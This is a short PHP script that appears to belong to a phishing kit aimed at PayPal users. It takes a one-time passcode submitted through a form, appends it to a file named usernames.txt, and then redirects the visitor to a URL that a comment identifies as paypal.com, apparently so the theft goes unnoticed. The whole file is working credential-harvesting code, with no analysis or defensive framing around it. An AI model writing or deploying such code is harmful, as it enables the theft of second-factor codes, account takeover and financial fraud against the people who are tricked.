<?php
file_put_contents("usernames.txt", "OTP: " . $_POST['otpCode'] . "\n", FILE_APPEND);
$url = "redirectUrl"; # https://www.paypal.com
header("Location: $url");
exit();
?>